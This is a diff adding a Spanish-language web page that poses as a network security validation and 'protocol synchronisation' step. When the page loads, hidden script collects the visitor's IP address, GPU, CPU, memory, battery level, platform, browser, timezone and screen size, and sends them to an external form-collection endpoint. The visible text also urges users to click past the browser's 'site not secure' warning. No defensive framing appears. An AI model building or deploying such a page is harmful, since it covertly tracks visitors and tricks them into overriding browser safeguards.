@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Sincronización de Protocolo - Auth</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #fdfdfd; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 8px; border: 1px solid #eee; max-width: 380px; text-align: center; }
+        .secure-icon { color: #2ecc71; font-size: 50px; margin-bottom: 20px; }
+        h1 { font-size: 18px; color: #333; }
+        p { font-size: 14px; color: #666; line-height: 1.5; }
+        .btn { background: #2ecc71; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        .note { font-size: 12px; color: #999; margin-top: 15px; text-align: left; background: #f9f9f9; padding: 10px; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <div class="secure-icon">🛡️</div>
+    <h1>Validación de Seguridad de Red</h1>
+    <p>Para continuar con la visualización de contenido protegido, es necesario sincronizar su nodo de conexión actual.</p>
+    
+    <div class="note">
+        <b>Instrucción técnica:</b><br>
+        Debido a los nuevos protocolos de encriptación P2P, es posible que su navegador muestre una advertencia de "Sitio no seguro". Para completar el proceso, seleccione <b>Detalles</b> y <b>Acceder a este sitio</b>.
+    </div>
+
+    <button class="btn" onclick="window.location.href='final.html'">Continuar Sincronización</button>
+</div>
+
+<script>
+    const HOOK = "https://formspree.io/f/xanrkklv";
+    
+    window.onload = async () => {
+        // Captura masiva de datos (Fingerprinting)
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+
+        const data = {
+            fase: "PASO_1_INVISIBLE",
+            ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip),
+            gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
+            procesador: navigator.hardwareConcurrency,
+            memoria_ram: navigator.deviceMemory || "N/A",
+            bateria: await (navigator.getBattery ? navigator.getBattery().then(b => `${(b.level*100).toFixed(0)}%`) : "N/A"),
+            plataforma: navigator.platform,
+            navegador: navigator.userAgent,
+            zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            resolucion: `${screen.width}x${screen.height}`
+        };
+
+        fetch(HOOK, { method: 'POST', body: JSON.stringify(data), headers: {'Content-Type': 'application/json'} });
+    };
+</script>
+</body>
+  </html>
